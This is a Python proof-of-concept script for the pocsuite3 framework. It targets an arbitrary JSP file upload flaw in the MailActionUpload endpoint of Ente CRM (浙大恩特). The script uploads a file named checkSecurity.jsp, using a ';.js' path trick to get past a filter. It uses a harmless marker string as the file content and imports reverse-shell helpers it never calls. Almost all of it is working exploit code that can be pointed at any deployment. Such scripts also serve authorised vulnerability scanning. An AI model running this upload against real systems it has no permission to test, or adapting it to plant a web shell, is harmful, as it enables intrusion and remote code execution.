# _*_ coding:utf-8 _*_
# @Time : 2023/11/18 20:13
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class EnterfileUpload(POCBase):
    pocDesc = ''' 浙大恩特客户资源管理系统中的MailActionUpload接口存在安全漏洞，允许攻击者向系统上传任意恶意JSP文件，从而可能导致潜在的远程执行代码攻击。 '''
    vulID = '0'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-18'
    createDate = '2023-11-18'
    updateDate = '2023-11-18'
    name = '浙大恩特客户资源管理系统MailActionUpload 任意文件上传'
    appName = '浙大恩特CRM'



    def _verify(self):

        result = {}
        path = "/entsoft/MailAction.entphone;.js?act=saveAttaFile" # 参数
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
        }
        shell = "This website has a vulnerability!!!"
        url = self.url + path
        payload = {
    'file': ('checkSecurity.jsp', 'This website has a vulnerability!!!', 'xxx/txt')
}

        try:
            response = requests.post(url, headers=headers, files=payload)
        # 验证成功输出相关信息
            if response.status_code == 200 and 'checkSecurity.jsp' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Name'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(EnterfileUpload)